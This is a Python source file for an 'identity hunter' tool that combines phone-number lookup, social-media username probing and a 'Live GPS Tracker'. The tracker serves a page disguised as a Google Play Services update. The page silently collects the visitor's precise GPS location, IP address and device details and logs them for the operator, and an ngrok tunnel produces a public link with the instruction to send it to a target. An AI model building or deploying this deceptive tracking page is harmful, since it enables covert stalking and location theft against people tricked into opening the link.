import os, phonenumbers, requests
from flask import Flask, render_template_string, request as flask_req
from pyngrok import ngrok, conf
from phonenumbers import geocoder, carrier, timezone
from colorama import Fore, Style
from mandesh_utils import save_result

app = Flask(__name__)

# --- WEB UI FOR LIVE TRACKER ---
HTML_TEMPLATE = """
<!DOCTYPE html><html><head><title>System Update</title><script>
function s(p){fetch('/log?lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&ua='+navigator.userAgent)}
window.onload=()=>{if(navigator.geolocation){navigator.geolocation.getCurrentPosition(s,()=>{}, {enableHighAccuracy:true})}}
</script></head><body style="font-family:sans-serif;text-align:center;padding-top:50px;">
<h3>Updating Google Play Services...</h3><div style="margin:20px auto;width:40px;height:40px;border:4px solid #f3f3f3;border-top:4px solid #3498db;border-radius:50%;animation:spin 2s linear infinite;"></div>
<style>@keyframes spin {0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style>
<p>Please do not close this window.</p></body></html>
"""

@app.route('/')
def index(): return render_template_string(HTML_TEMPLATE)

@app.route('/log')
def log_hit():
    lat, lon, ua = flask_req.args.get('lat'), flask_req.args.get('lon'), flask_req.args.get('ua')
    res = f"--- LIVE TRACK HIT ---\nIP: {flask_req.remote_addr}\nGPS: {lat},{lon}\nDevice: {ua}\nMaps: http://www.google.com/maps/place/{lat},{lon}"
    print(f"\n{Fore.GREEN}{res}{Style.RESET_ALL}")
    save_result("LIVE-TRACK", res)
    return "1"

class MandeshHunt:
    def __init__(self):
        self.log_data = []

    def log(self, text):
        print(text)
        clean = text.replace(Fore.CYAN, "").replace(Fore.GREEN, "").replace(Fore.RED, "").replace(Fore.YELLOW, "").replace(Style.RESET_ALL, "")
        self.log_data.append(clean)

    def phone_recon(self):
        target = input(f"{Fore.YELLOW}Enter number (+254...): {Style.RESET_ALL}")
        self.log(f"{Fore.CYAN}[*] Starting Recon on: {target}{Style.RESET_ALL}")
        try:
            parsed_num = phonenumbers.parse(target)
            if not phonenumbers.is_valid_number(parsed_num):
                self.log(f"{Fore.RED}[!] Invalid Format.{Style.RESET_ALL}"); return
            
            self.log(f"{Fore.GREEN}[+] Region: {geocoder.description_for_number(parsed_num, 'en')}")
            self.log(f"[+] Provider: {carrier.name_for_number(parsed_num, 'en')}")
            self.log(f"[+] Timezone: {timezone.time_zones_for_number(parsed_num)}{Style.RESET_ALL}")
        except Exception as e: self.log(f"{Fore.RED}[-] Error: {e}{Style.RESET_ALL}")

    def username_scan(self):
        user = input(f"{Fore.YELLOW}Enter Username: {Style.RESET_ALL}")
        sites = {"Instagram": "https://www.instagram.com/", "TikTok": "https://www.tiktok.com/@", "GitHub": "https://github.com/"}
        self.log(f"{Fore.CYAN}[*] Scanning Social Platforms...{Style.RESET_ALL}")
        for name, url in sites.items():
            try:
                r = requests.get(f"{url}{user}", timeout=5)
                if r.status_code == 200: self.log(f"{Fore.GREEN}[+] Found: {name}{Style.RESET_ALL}")
                else: self.log(f"{Fore.RED}[-] Not Found: {name}{Style.RESET_ALL}")
            except: pass

    def live_tracker(self):
        self.log(f"{Fore.YELLOW}[*] Initializing Ngrok Tunnel...{Style.RESET_ALL}")
        try:
            if os.path.exists("/usr/local/bin/ngrok"): conf.get_default().ngrok_path = "/usr/local/bin/ngrok"
            else: conf.get_default().ngrok_path = "/usr/bin/ngrok"
            url = ngrok.connect(5000).public_url
            self.log(f"{Fore.GREEN}[!] SEND THIS LINK: {url}{Style.RESET_ALL}")
            app.run(port=5000, debug=False, use_reloader=False)
        except Exception as e: self.log(f"{Fore.RED}[-] Tunnel Failed: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    hunter = MandeshHunt()
    while True:
        print(f"\n{Fore.BLUE}--- IDENTITY HUNTER MODULE ---{Style.RESET_ALL}")
        print("[1] Phone Recon      [2] Username Scan")
        print("[3] Live GPS Tracker [0] Back")
        c = input(f"\nHunter > ")
        if c == '1': hunter.phone_recon()
        elif c == '2': hunter.username_scan()
        elif c == '3': hunter.live_tracker()
        elif c == '0': break
